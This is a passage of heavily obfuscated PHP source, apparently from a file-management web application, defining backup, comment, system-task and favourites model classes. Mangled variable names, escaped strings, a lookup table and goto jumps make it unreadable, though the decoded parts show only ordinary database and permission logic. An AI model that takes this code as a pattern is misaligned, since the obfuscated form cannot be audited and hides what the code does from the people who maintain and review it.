array_merge($ÑéÖìÁ, $×µüÎÂš); $×µüÎÂš[$Œ”¨òŞ[1830]] = $this->getSort(); $this->filterAuth($×µüÎÂš[$Œ”¨òŞ[414]]); return parent::insert($×µüÎÂš); } private function getSort() { $´Ìµ¡„à =& $_SERVER[¥Ÿ©ÒèÌ]; $‘›ÊÌ’ş = parent::listData(); $·èº¾¦Ø = array_to_keyvalue($‘›ÊÌ’ş, $´Ìµ¡„à[12], $´Ìµ¡„à[1830]); return empty($·èº¾¦Ø) ? 0 : max($·èº¾¦Ø) + 1; } private function filterAuth(&$ŒÇñ×ŒÄ) { if (!$ŒÇñ×ŒÄ) { return; } $£ßøÈ´ø = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ŒÓÊş™Ø = array(); foreach ($£ßøÈ´ø as $ºàíÑù) { if ($ŒÇñ×ŒÄ & $ºàíÑù) { $ŒÓÊş™Ø[] = $ºàíÑù; } } if (in_array(self::AUTH_ROOT, $ŒÓÊş™Ø)) { $ŒÇñ×ŒÄ = array_sum($£ßøÈ´ø); return; } $‚“—´¸¢ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ŒÓÊş™Ø as $ºàíÑù) { if (isset($‚“—´¸¢[$ºàíÑù])) { $ŒÓÊş™Ø = array_merge($ŒÓÊş™Ø, $‚“—´¸¢[$ºàíÑù]); } } $ŒÓÊş™Ø[] = self::AUTH_SHOW; $ŒÇñ×ŒÄ = array_sum(array_unique($ŒÓÊş™Ø)); } public function sort($ì÷ùÈæº, $¦ÊÇˆé) { return parent::update($ì÷ùÈæº, $¦ÊÇˆé); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x62\141\x63\x6b\x75\160\114\x69\163\x74"; public $field = array("\x69\x6f", "\x6e\141\155\x65", "\163\164\141\164\165\163", "\x63\157\156\164\x65\156\164", "\155\141\x6e\x75\141\x6c", "\x72\145\x73\x75\154\x74", "\164\x69\x6d\145\x46\x72\157\x6d", "\164\x69\x6d\x65\x54\157"); public function config() { $à›úÜ¯Â =& $_SERVER[¥Ÿ©ÒèÌ]; $ÁÜÙÎ = Model($à›úÜ¯Â[760])->get($à›úÜ¯Â[770]); $ÁÜÙÎ = json_decode($ÁÜÙÎ, !0); $ÁÜÙÎ = is_array($ÁÜÙÎ) ? $ÁÜÙÎ : array(); if (!isset($ÁÜÙÎ[$à›úÜ¯Â[745]])) { $ÁÜÙÎ[$à›úÜ¯Â[745]] = $à›úÜ¯Â[89]; } unset($ÁÜÙÎ[$à›úÜ¯Â[1609]]); Action($à›úÜ¯Â[1831])->taskInit(); Model($à›úÜ¯Â[1608])->cacheClear(); $™Ö™¼Öˆ = $à›úÜ¯Â[1832]; $ãĞÍ®ñõ = Model($à›úÜ¯Â[1833])->findByKey($à›úÜ¯Â[1627], $™Ö™¼Öˆ); if (!$ãĞÍ®ñõ) { $ãĞÍ®ñõ = array(); } if (isset($ãĞÍ®ñõ[$à›úÜ¯Â[196]])) { $ãĞÍ®ñõ[$à›úÜ¯Â[196]] = json_decode($ãĞÍ®ñõ[$à›úÜ¯Â[196]], !0); } if (isset($ÁÜÙÎ[$à›úÜ¯Â[196]])) { $ãĞÍ®ñõ[$à›úÜ¯Â[196]][$à›úÜ¯Â[1612]] = $ÁÜÙÎ[$à›úÜ¯Â[196]]; unset($ÁÜÙÎ[$à›úÜ¯Â[196]]); } return array_merge($ãĞÍ®ñõ, $ÁÜÙÎ); } public function listData($ŸÑ¼÷—† = false, $ƒüƒÏÒå = "\x6d\157\144\x69\146\171\124\x69\155\145", $öƒ÷ï¦ = false) { return parent::listData($ŸÑ¼÷—†, $ƒüƒÏÒå, !0); } public function lastItem() { $°Ï¥–¨Ë = $this->listData(); return !empty($°Ï¥–¨Ë[0]) ? $°Ï¥–¨Ë[0] : null; } public function kill($µõ”Şæ–) { $€¡Û±Ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ó„ Ï‰² = $this->listData($µõ”Şæ–); if (!$Ó„ Ï‰² || empty($Ó„ Ï‰²[$€¡Û±Ñ[32]])) { return !0; } Task::kill($€¡Û±Ñ[769]); Task::kill($€¡Û±Ñ[790]); Task::kill($€¡Û±Ñ[799]); $¼„Ñ› = $Ó„ Ï‰²[$€¡Û±Ñ[32]]; $ëŞºÙŞÔ = TEMP_FILES . $€¡Û±Ñ[768] . $¼„Ñ› . $€¡Û±Ñ[8]; IO::remove($ëŞºÙŞÔ, !1); return $this->remove($µõ”Şæ–); } public function remove($ÉòæŸİ˜) { $¢ĞŠï´€ = $this->listData($ÉòæŸİ˜); if (!$¢ĞŠï´€) { return !0; } return $this->backupRemove($¢ĞŠï´€); } private function backupRemove($™¥šî…–) { parent::remove($™¥šî…–[$_SERVER[¥Ÿ©ÒèÌ][401]]); $ÔÏ‡õ¥ä = $this->backupPath($™¥šî…–); IO::remove($ÔÏ‡õ¥ä, !1); return !0; } private function backupPath($â­ë€àî) { $€çàÇ†í =& $_SERVER[¥Ÿ©ÒèÌ]; $ªªÊ¥ÔÑ = $â­ë€àî[$€çàÇ†í[32]]; $¹‹”²¶˜ = Model($€çàÇ†í[760])->get($€çàÇ†í[761]); $ØíéÊ¢ò = substr(md5($€çàÇ†í[762] . $¹‹”²¶˜ . $ªªÊ¥ÔÑ), 0, 8); return "\x7b\151\157\72{$â­ë€àî[$€çàÇ†í[742]]}\175\x2f\x64\x61\164\141\142\x61\163\x65\x2f\142\141\143\153\x75\x70\x2f" . $ªªÊ¥ÔÑ . $€çàÇ†í[11] . $ØíéÊ¢ò; } public function start() { $¿šùÎ‹¾ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($GLOBALS[$¿šùÎ‹¾[6]][$¿šùÎ‹¾[90]][$¿šùÎ‹¾[1834]] != $¿šùÎ‹¾[89]) { return !0; } $€®Å€ê× = $this->config(); if (!$€®Å€ê× || $€®Å€ê×[$¿šùÎ‹¾[1609]] != $¿šùÎ‹¾[89]) { return !1; } $Ï¢¿ŠÃ¹ = $this->process(); foreach ($Ï¢¿ŠÃ¹ as $ƒ‘ÎÓ’¦) { if ($ƒ‘ÎÓ’¦) { return Task::restart($ƒ‘ÎÓ’¦[$¿šùÎ‹¾[401]]); } } $—‰ß¼ˆß = new Backup(); $à†ÀÌ = $—‰ß¼ˆß->db(); if ($à†ÀÌ) { $à†ÀÌ = $—‰ß¼ˆß->dbFile(); if ($à†ÀÌ && $€®Å€ê×[$¿šùÎ‹¾[745]] == $¿šùÎ‹¾[190]) { $à†ÀÌ = $—‰ß¼ˆß->file(); } } Backup::set(array($¿šùÎ‹¾[740] => 1, $¿šùÎ‹¾[496] => time())); return !0; } public function process() { $†é·ùË… =& $_SERVER[¥Ÿ©ÒèÌ]; $Œ»Îîøä = array($†é·ùË…[748] => Task::get($†é·ùË…[769]), $†é·ùË…[752] => Task::get($†é·ùË…[790]), $†é·ùË…[192] => Task::get($†é·ùË…[799])); $¾ÏİØò¤ = !1; foreach ($Œ»Îîøä as &$ù çĞ€) { if ($¾ÏİØò¤) { $ù çĞ€ = !1; continue; } if ($ù çĞ€) { $‹ØøÑè = intval(_get($ù çĞ€, $†é·ùË…[1644], 0)); if (time() - $‹ØøÑè > 7200) { Task::kill($ù çĞ€[$†é·ùË…[401]]); $¾ÏİØò¤ = !0; $ù çĞ€ = !1; } } } return $Œ»Îîøä; } public function restore() { $™€ô‘•» =& $_SERVER[¥Ÿ©ÒèÌ]; ActionCall($™€ô‘•»[1046], !0, 1); ActionCall($™€ô‘•»[1046], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\164\141\142\x6c\145\116\141\x6d\145" => "\x63\x6f\155\155\145\156\164\x5f\x6d\145\x74\x61", "\155\145\x74\x61\x46\151\x65\x6c\144" => "\143\157\155\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($øÄÕõÃ) { $âä³ÅŸ‘ =& $_SERVER[¥Ÿ©ÒèÌ]; if ($øÄÕõÃ[$âä³ÅŸ‘[1835]]) { $çè†ÁÉ™ = $this->where(array($âä³ÅŸ‘[1836] => $øÄÕõÃ[$âä³ÅŸ‘[1835]]))->find(); if (!$çè†ÁÉ™ || $çè†ÁÉ™[$âä³ÅŸ‘[412]] != $øÄÕõÃ[$âä³ÅŸ‘[412]] || $çè†ÁÉ™[$âä³ÅŸ‘[504]] != $øÄÕõÃ[$âä³ÅŸ‘[504]]) { return !1; } $this->where(array($âä³ÅŸ‘[1836] => $øÄÕõÃ[$âä³ÅŸ‘[1835]]))->setAdd($âä³ÅŸ‘[1837], 1); } $øÄÕõÃ[$âä³ÅŸ‘[1838]] = 0; $øÄÕõÃ[$âä³ÅŸ‘[1837]] = 0; $øÄÕõÃ[$âä³ÅŸ‘[740]] = 1; return $this->add($øÄÕõÃ); } public function commentCount($ô•±ºşÌ, $¤»òÁ©ø, $ÑÅ÷‡ğ = false) { $“ïÛ›–Š =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ô•±ºşÌ) { return array(); } if (is_string($ô•±ºşÌ) || is_int($ô•±ºşÌ)) { $ô•±ºşÌ = array($ô•±ºşÌ); } $­ÜéåÛ = array($“ïÛ›–Š[504], $“ïÛ›–Š[1839] => $“ïÛ›–Š[500]); $³ÁËşôà = array($“ïÛ›–Š[504] => array($“ïÛ›–Š[7], $ô•±ºşÌ), $“ïÛ›–Š[412] => $¤»òÁ©ø); if ($ÑÅ÷‡ğ) { $³ÁËşôà[$“ïÛ›–Š[1639]] = $ÑÅ÷‡ğ; } $àûåƒ§ = $this->field($­ÜéåÛ)->where($³ÁËşôà)->group($“ïÛ›–Š[504])->select(); return array_to_keyvalue($àûåƒ§, $“ïÛ›–Š[504], $“ïÛ›–Š[500]); } public function starTarget($Ü–Œ‰°Ü, $é³ü°á¢) { $°äì˜ =& $_SERVER[¥Ÿ©ÒèÌ]; $©ë³õñ = $Ü–Œ‰°Ü + self::TYPE_STAR_OFFSET; $ØßŸˆ± = array($°äì˜[1639] => USER_ID, $°äì˜[412] => $©ë³õñ, $°äì˜[504] => $é³ü°á¢); $€…˜¹òá = $this->where($ØßŸˆ±)->find(); if ($€…˜¹òá) { return $this->where(array($°äì˜[401] => $€…˜¹òá[$°äì˜[401]]))->delete(); } $ôˆ²‚›ü = array($°äì˜[1835] => 0, $°äì˜[1639] => USER_ID, $°äì˜[740] => 1, $°äì˜[745] => $°äì˜[12], $°äì˜[412] => $©ë³õñ, $°äì˜[504] => $é³ü°á¢, $°äì˜[1838] => 0, $°äì˜[1837] => 0); return $this->add($ôˆ²‚›ü); } public function starTargetCount($ë·°‹éî, $Æ‡²ÙåÑ) { $ôÚ ¢ª¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $û‹÷Ëºï = $Æ‡²ÙåÑ + self::TYPE_STAR_OFFSET; $¯Ê—¸íª = $this->commentCount($ë·°‹éî, $û‹÷Ëºï); $½¤éìÄ = $this->commentCount($ë·°‹éî, $û‹÷Ëºï, USER_ID); return array($ôÚ ¢ª¢[1840] => $¯Ê—¸íª, $ôÚ ¢ª¢[1841] => $½¤éìÄ); } public function starTargetUserList($åã¿“¦, $†™İ§ÇĞ) { $ª·Ş¾œ =& $_SERVER[¥Ÿ©ÒèÌ]; $’×€äËÑ = $åã¿“¦ + self::TYPE_STAR_OFFSET; $Ë’µî¤ = array($ª·Ş¾œ[504] => $†™İ§ÇĞ, $ª·Ş¾œ[412] => $’×€äËÑ); $‹Â¯‘šø = $this->where($Ë’µî¤)->count(); $Á¸š€çˆ = array($ª·Ş¾œ[259] => $‹Â¯‘šø, $ª·Ş¾œ[1842] => array()); if (!$‹Â¯‘šø) { return $Á¸š€çˆ; } $©öËğÅÓ = $this->field($ª·Ş¾œ[1639])->where($Ë’µî¤)->limit(500)->select(); $©öËğÅÓ = array_to_keyvalue($©öËğÅÓ, $ª·Ş¾œ[12], $ª·Ş¾œ[1639]); $Á¸š€çˆ[$ª·Ş¾œ[1842]] = Model($ª·Ş¾œ[513])->userListInfo($©öËğÅÓ); return $Á¸š€çˆ; } public function prasiseUserList($óáÇÂü) { $‡›Êóôİ =& $_SERVER[¥Ÿ©ÒèÌ]; $ãÉø…” = array($‡›Êóôİ[1843] => $óáÇÂü); $ãˆ´÷óû = $this->where($ãÉø…”)->find(); $¾Ë„œ¬„ = _get($ãˆ´÷óû, $‡›Êóôİ[1838], 0); $Å°Å¼ëû = array($‡›Êóôİ[259] => $¾Ë„œ¬„, $‡›Êóôİ[1842] => array()); if (!$¾Ë„œ¬„) { return $Å°Å¼ëû; } $¹‘¹Áê¯ = Model($‡›Êóôİ[1844])->field($‡›Êóôİ[1639])->where($ãÉø…”)->limit(500)->select(); $¹‘¹Áê¯ = array_to_keyvalue($¹‘¹Áê¯, $‡›Êóôİ[12], $‡›Êóôİ[1639]); $Å°Å¼ëû[$‡›Êóôİ[1842]] = Model($‡›Êóôİ[513])->userListInfo($¹‘¹Áê¯); return $Å°Å¼ëû; } public function remove($ºş€“éì) { $Ç°¯¥å =& $_SERVER[¥Ÿ©ÒèÌ]; $û øöÊå = array($Ç°¯¥å[1836] => $ºş€“éì); $…şú¹í¡ = $this->where($û øöÊå)->find(); if ($…şú¹í¡[$Ç°¯¥å[1835]]) { $this->where(array($Ç°¯¥å[1836] => $…şú¹í¡[$Ç°¯¥å[1835]]))->setAdd($Ç°¯¥å[1837], -1); } return $this->where($û øöÊå)->delete(); } public function edit($’ªÆçşŠ, $”ïÛ¤Ä) { $³´÷ÒÁ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŸÍª·ñÙ = array($³´÷ÒÁ[1836] => $’ªÆçşŠ); return $this->where($ŸÍª·ñÙ)->save(array($³´÷ÒÁ[1845] => $”ïÛ¤Ä)); } public function prasise($›¦Äö¦Î) { $Ò·çœô =& $_SERVER[¥Ÿ©ÒèÌ]; $Š¨ù³õñ = Model($Ò·çœô[1846]); $îö”œ¹º = array($Ò·çœô[1836] => $›¦Äö¦Î, $Ò·çœô[1630] => USER_ID); $§Æ¶¼ï = $Š¨ù³õñ->where($îö”œ¹º)->find(); if (!$§Æ¶¼ï) { $Š¨ù³õñ->add($îö”œ¹º); $íêÕçêã = $this->where(array($Ò·çœô[1836] => $›¦Äö¦Î))->setAdd($Ò·çœô[1838], 1); } else { $Š¨ù³õñ->where($îö”œ¹º)->delete(); $íêÕçêã = $this->where(array($Ò·çœô[1836] => $›¦Äö¦Î))->setAdd($Ò·çœô[1838], -1); } return $íêÕçêã; } public function targetInfo($Â£©öÂù, $¦·ùŞºœ) { $òÙì­»ñ =& $_SERVER[¥Ÿ©ÒèÌ]; $³ºÍ±•‚ = array($òÙì­»ñ[580] => $Â£©öÂù, $òÙì­»ñ[581] => $¦·ùŞºœ); $ï”‹‹ƒğ = $this->where($³ºÍ±•‚)->count(); $²‡òïº = "\x52\111\107\x48\124\40\x4a\117\111\116\40{$this->tablePrefix}\x63\x6f\155\155\145\x6e\164\137\160\x72\141\151\x73\x65\40\163\x74\141\162\x20\x6f\156\x20\143\x6f\x6d\155\x65\156\x74\56\143\157\x6d\155\145\x6e\164\111\x44\40\x3d\x20\163\164\141\162\x2e\x63\157\x6d\155\x65\156\164\111\104"; $çæÂÀÔƒ = $this->alias($òÙì­»ñ[358])->where($³ºÍ±•‚)->join($²‡òïº, $òÙì­»ñ[1847])->count(); $ëÓÚ£ = array($òÙì­»ñ[1848] => $ï”‹‹ƒğ, $òÙì­»ñ[1849] => $çæÂÀÔƒ); return $ëÓÚ£; } public function listData($ä™›Êùù) { $Àƒ¹™ˆº =& $_SERVER[¥Ÿ©ÒèÌ]; if (isset($ä™›Êùù[$Àƒ¹™ˆº[1850]])) { if ($ä™›Êùù[$Àƒ¹™ˆº[1850]]) { $ä™›Êùù[$Àƒ¹™ˆº[1843]] = array($Àƒ¹™ˆº[1000], intval($ä™›Êùù[$Àƒ¹™ˆº[1850]])); } unset($ä™›Êùù[$Àƒ¹™ˆº[1850]]); } if (isset($ä™›Êùù[$Àƒ¹™ˆº[1851]])) { if ($ä™›Êùù[$Àƒ¹™ˆº[1851]]) { $ä™›Êùù[$Àƒ¹™ˆº[1843]] = array($Àƒ¹™ˆº[997], intval($ä™›Êùù[$Àƒ¹™ˆº[1851]])); } unset($ä™›Êùù[$Àƒ¹™ˆº[1851]]); } return $this->_listData($ä™›Êùù); } private function _listData($üæ£§Úñ) { $¨¡ØÑ” =& $_SERVER[¥Ÿ©ÒèÌ]; $Ü­ãà¼Š = $this->where($üæ£§Úñ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ü­ãà¼Š[$¨¡ØÑ”[373]]); $this->_listAppendUser($Ü­ãà¼Š[$¨¡ØÑ”[373]]); $this->_listAppendMeta($Ü­ãà¼Š[$¨¡ØÑ”[373]]); return $Ü­ãà¼Š; } private function _makeOrder() { $œÍÄÄ• =& $_SERVER[¥Ÿ©ÒèÌ]; $®ûÚîÁà = array($œÍÄÄ•[1838], $œÍÄÄ•[1837], $œÍÄÄ•[193]); $Å‰Ó®ú¶ = Input::get($œÍÄÄ•[455], $œÍÄÄ•[7], $œÍÄÄ•[424], $®ûÚîÁà); $ÃŞÑ†´½ = Input::get($œÍÄÄ•[456], $œÍÄÄ•[7], $œÍÄÄ•[1632], array($œÍÄÄ•[1852], $œÍÄÄ•[451])); $´Û¬ï‹ = $Å‰Ó®ú¶ . $œÍÄÄ•[53] . $ÃŞÑ†´½; return $this->order($´Û¬ï‹); } private function _listAppendParent(&$•‚Ì×ğë) { $òéÙì®â =& $_SERVER[¥Ÿ©ÒèÌ]; $Ç®ÅƒŸÀ = array_unique(array_to_keyvalue($•‚Ì×ğë, $òéÙì®â[12], $òéÙì®â[1835])); $Ç®ÅƒŸÀ = array_remove_value($Ç®ÅƒŸÀ, $òéÙì®â[190]); if (!$Ç®ÅƒŸÀ) { return; } $ÄóÉ† = $this->where(array($òéÙì®â[1836] => array($òéÙì®â[7], $Ç®ÅƒŸÀ)))->select(); $ÄóÉ† = array_to_keyvalue($ÄóÉ†, $òéÙì®â[1843]); foreach ($•‚Ì×ğë as &$÷¬¾Æï™) { if (isset($ÄóÉ†[$÷¬¾Æï™[$òéÙì®â[1835]]])) { $÷¬¾Æï™[$òéÙì®â[1853]] = $ÄóÉ†[$÷¬¾Æï™[$òéÙì®â[1835]]]; } } unset($÷¬¾Æï™); } private function _listAppendUser(&$ÙÚ—‚œí) { $î¹”Á…™ =& $_SERVER[¥Ÿ©ÒèÌ]; $ö™Õ‹ = array_unique(array_to_keyvalue($ÙÚ—‚œí, $î¹”Á…™[12], $î¹”Á…™[1639])); $ö™Õ‹ = array_remove_value($ö™Õ‹, $î¹”Á…™[190]); if (count($ö™Õ‹) == 0) { return; } foreach ($ÙÚ—‚œí as $úû€å§ò) { if (isset($úû€å§ò[$î¹”Á…™[1853]])) { $ö™Õ‹[] = $úû€å§ò[$î¹”Á…™[1853]][$î¹”Á…™[1639]]; } } $ŒÀü›ğ· = Model($î¹”Á…™[538])->userListInfo($ö™Õ‹); foreach ($ÙÚ—‚œí as &$úû€å§ò) { $úû€å§ò[$î¹”Á…™[594]] = $ŒÀü›ğ·[$úû€å§ò[$î¹”Á…™[1639]]]; if (isset($úû€å§ò[$î¹”Á…™[1853]])) { $úû€å§ò[$î¹”Á…™[1853]][$î¹”Á…™[594]] = $ŒÀü›ğ·[$úû€å§ò[$î¹”Á…™[1853]][$î¹”Á…™[1639]]]; } } unset($úû€å§ò); } private function _listAppendMeta(&$ã¨­æ¹) { $·¯¿üÏ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÖÁíŞÚÌ = array_unique(array_to_keyvalue($ã¨­æ¹, $·¯¿üÏ[12], $·¯¿üÏ[1843])); $ÖÁíŞÚÌ = array_remove_value($ÖÁíŞÚÌ, $·¯¿üÏ[190]); if (!$ÖÁíŞÚÌ) { return; } foreach ($ã¨­æ¹ as $‡‡–Ñ) { if (isset($‡‡–Ñ[$·¯¿üÏ[1853]])) { $ÖÁíŞÚÌ[] = $‡‡–Ñ[$·¯¿üÏ[1853]][$·¯¿üÏ[1843]]; } } $—ÈÌŞö = $this->metaList($ÖÁíŞÚÌ); if (!$—ÈÌŞö) { return !1; } foreach ($ã¨­æ¹ as &$‡‡–Ñ) { $‡‡–Ñ[$·¯¿üÏ[465]] = $—ÈÌŞö[$‡‡–Ñ[$·¯¿üÏ[1843]]]; if (isset($‡‡–Ñ[$·¯¿üÏ[1853]])) { $‡‡–Ñ[$·¯¿üÏ[1853]][$·¯¿üÏ[465]] = $—ÈÌŞö[$‡‡–Ñ[$·¯¿üÏ[1853]][$·¯¿üÏ[1843]]]; } } unset($‡‡–Ñ); } private function metaList($èÆÛ‹£å) { $´É›Ü¾¶ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$èÆÛ‹£å) { return array(); } $ÍŠìïë = array($´É›Ü¾¶[1843] => array($´É›Ü¾¶[7], $èÆÛ‹£å)); $˜İÂ™Ù = Model($´É›Ü¾¶[1854])->where($ÍŠìïë)->select(); $˜İÂ™Ù = array_to_keyvalue_group($˜İÂ™Ù, $´É›Ü¾¶[1843]); foreach ($˜İÂ™Ù as $¾ôäğØ› => $ÆÔ¸§¾´) { $¢’¦Åì¨ = array(); foreach ($ÆÔ¸§¾´ as $¸µĞßéÅ) { $¢’¦Åì¨[$¸µĞßéÅ[$´É›Ü¾¶[95]]] = $¸µĞßéÅ[$´É›Ü¾¶[378]]; } $˜İÂ™Ù[$¾ôäğØ›] = $¢’¦Åì¨; } return $˜İÂ™Ù ? $˜İÂ™Ù : array(); } } goto d¨Œò›Á´; Céøõ¡…«á: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\56\164\x61\x73\x6b\x4c\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x74\x79\160\x65", "\x65\x76\145\x6e\164", "\x74\151\x6d\145", "\x64\x65\x73\143", "\163\171\x73\164\x65\155", "\145\156\x61\x62\154\145", "\x6c\141\x73\164\x52\165\156", "\163\157\x72\164"); public function listData($…¢ÃÇ¤ = false, $İ“óğ·× = "\163\x6f\x72\164", $òìÎ‘²Ã = false) { return parent::listData($…¢ÃÇ¤, $İ“óğ·×, $òìÎ‘²Ã); } public function add($™äƒ›·) { $Ê¾„‹ù¬ =& $_SERVER[¥Ÿ©ÒèÌ]; $ò¢–ı• = $this->findByName($™äƒ›·[$Ê¾„‹ù¬[32]]); if ($ò¢–ı•) { return !1; } $™äƒ›·[$Ê¾„‹ù¬[1600]] = 0; $™äƒ›·[$Ê¾„‹ù¬[1830]] = $this->getSort(); return parent::insert($™äƒ›·); } private function getSort() { $°şºü» =& $_SERVER[¥Ÿ©ÒèÌ]; $—õƒ¥å‚ = parent::listData(); $ƒ•¢²òÑ = array_to_keyvalue($—õƒ¥å‚, $°şºü»[12], $°şºü»[1830]); return empty($ƒ•¢²òÑ) ? 0 : max($ƒ•¢²òÑ) + 1; } public function update($¯ŒÕ±ø«, $®Ùƒ¢é‡) { $Íº·¤‘• =& $_SERVER[¥Ÿ©ÒèÌ]; $ùÙúñó = $this->listData($¯ŒÕ±ø«); $ã’ÉÍÏ‘ = $this->findByName($®Ùƒ¢é‡[$Íº·¤‘•[32]]); if (!$ùÙúñó || $ã’ÉÍÏ‘ && $ã’ÉÍÏ‘[$Íº·¤‘•[401]] != $ùÙúñó[$Íº·¤‘•[401]]) { return !1; } return parent::update($¯ŒÕ±ø«, $®Ùƒ¢é‡); } public function remove($•ö¨òöî, $®‘â·Î¾ = false) { $óÇÎÓó =& $_SERVER[¥Ÿ©ÒèÌ]; $½ˆ€Š‚ = $this->listData($•ö¨òöî); if (!$½ˆ€Š‚) { return; } if (!$®‘â·Î¾ && $½ˆ€Š‚[$óÇÎÓó[1260]] == $óÇÎÓó[89]) { return !1; } return parent::remove($•ö¨òöî); } public function enable($õÒÄ’–‘, $ğ©îİò) { return $this->update($õÒÄ’–‘, array($_SERVER[¥Ÿ©ÒèÌ][2222] => $ğ©îİò)); } public function run($Éã„³¬Ş) { return $this->update($Éã„³¬Ş, array($_SERVER[¥Ÿ©ÒèÌ][2232] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($ÚÂ±ìî) { $²†şäê­ =& $_SERVER[¥Ÿ©ÒèÌ]; return array($²†şäê­[1915] => array(USER_ID, $²†şäê­[2233])); } protected function listData() { $ÉæıßŒ› =& $_SERVER[¥Ÿ©ÒèÌ]; $º‡”÷ãß = array($ÉæıßŒ›[1630] => USER_ID, $ÉæıßŒ›[483] => 0); $Äó»„ÎÔ = $ÉæıßŒ›[2234]; $·ÇÈ²Ü¤ = $this->field($Äó»„ÎÔ)->where($º‡”÷ãß)->order($ÉæıßŒ›[2235])->select(); return $·ÇÈ²Ü¤ ? $·ÇÈ²Ü¤ : array(); } protected function resetCache() { } protected function listView() { $í¦ƒÉ… =& $_SERVER[¥Ÿ©ÒèÌ]; $ÇæòÁñ = $this->listData(); $Ÿíúçœ› = array_filter_by_field($ÇæòÁñ, $í¦ƒÉ…[33], $í¦ƒÉ…[417]); $•¢¶Îî¸ = array_to_keyvalue($Ÿíúçœ›, $í¦ƒÉ…[12], $í¦ƒÉ…[78]); if (!$•¢¶Îî¸) { return $ÇæòÁñ; } $·İ¾«Ë = 2000; $¤ôÊ³ı = array($í¦ƒÉ…[418] => array($í¦ƒÉ…[419], $•¢¶Îî¸)); $²²á¿ = Model($í¦ƒÉ…[815])->listSource($¤ôÊ³ı, $·İ¾«Ë); $²²á¿ = array_merge($²²á¿[$í¦ƒÉ…[76]], $²²á¿[$í¦ƒÉ…[77]]); $²²á¿ = array_to_keyvalue($²²á¿, $í¦ƒÉ…[403]); foreach ($ÇæòÁñ as $İè“Ñ±Ô => $‹¼¥’İ—) { $À´ô“Æ = $²²á¿[$‹¼¥’İ—[$í¦ƒÉ…[78]]]; $À´ô“Æ = $À´ô“Æ ? $À´ô“Æ : array(); $ÇæòÁñ[$İè“Ñ±Ô] = array_merge($À´ô“Æ, $‹¼¥’İ—); } return $ÇæòÁñ; } protected function addFav($ø²ÂôÆË, $£ÑÄè± = '', $úå…Ë¸´ = "\x73\x6f\x75\x72\143\145") { $‚©‹È©¯ =& $_SERVER[¥Ÿ©ÒèÌ]; $à“¿‹ = array($‚©‹È©¯[1630] => USER_ID, $‚©‹È©¯[483] => 0, $‚©‹È©¯[423] => $úå…Ë¸´, $‚©‹È©¯[422] => $ø²ÂôÆË); if ($this->where($à“¿‹)->find()) { return !1; } $à“¿‹ = array($‚©‹È©¯[1630] => USER_ID, $‚©‹È©¯[483] => 0); $¯ÄşËØ = $this->where($à“¿‹)->max($‚©‹È©¯[1830]); if (!$¯ÄşËØ) { $¯ÄşËØ = 0; } if (!$£ÑÄè± && $úå…Ë¸´ == $‚©‹È©¯[417]) { $Ï®»èúº = Model($‚©‹È©¯[1311])->where(array($‚©‹È©¯[418] => $ø²ÂôÆË))->find(); if (!$Ï®»èúº) { return !1; } $£ÑÄè± = $Ï®»èúº[$‚©‹È©¯[32]]; } $£ÑÄè± = $this->getAutoName($£ÑÄè±); $©€Ñ³¡¸ = array($‚©‹È©¯[1630] => USER_ID, $‚©‹È©¯[483] => 0, $‚©‹È©¯[421] => $£ÑÄè±, $‚©‹È©¯[422] => $ø²ÂôÆË, $‚©‹È©¯[423] => $úå…Ë¸´, $‚©‹È©¯[1811] => $¯ÄşËØ + 1); return $this->add($©€Ñ³¡¸); } protected function remove($»š°²ê) { $ƒÚıÙÁ— =& $_SERVER[¥Ÿ©ÒèÌ]; $‰¯ô‰Ü€ = array($ƒÚıÙÁ—[1630] => USER_ID, $ƒÚıÙÁ—[420] => $»š°²ê); return $this->where($‰¯ô‰Ü€)->delete(); } protected function removeByName($Ö†‹ÎõÙ) { $©–„¦Ğœ =& $_SERVER[¥Ÿ©ÒèÌ]; $”Ù¹çı… = array($©–„¦Ğœ[1630] => USER_ID, $©–„¦Ğœ[421] => $Ö†‹ÎõÙ, $©–„¦Ğœ[483] => 0); return $this->where($”Ù¹çı…)->delete(); } protected function rename($ÕàÖ™ºÜ, $«Ğëõ³) { $’õè¤Ì =& $_SERVER[¥Ÿ©ÒèÌ]; if ($ÕàÖ™ºÜ == $«Ğëõ³) { return !1; } $‚çÍéà¸ = $this->getAutoName($«Ğëõ³); if ($«Ğëõ³ != $‚çÍéà¸) { return !1; } $‚¤Øğ× = array($’õè¤Ì[1630] => USER_ID, $’õè¤Ì[483] => 0, $’õè¤Ì[32] => $ÕàÖ™ºÜ); return $this->where($‚¤Øğ×)->save(array($’õè¤Ì[32] => $«Ğëõ³)); } protected function resetSort($İ™²äÏ½) { $îÎ–¬›ï =& $_SERVER[¥Ÿ©ÒèÌ]; $İ™²äÏ½ = is_array($İ™²äÏ½) ? $İ™²äÏ½ : array(); $Ãî±ñè° = array($îÎ–¬›ï[1630] => 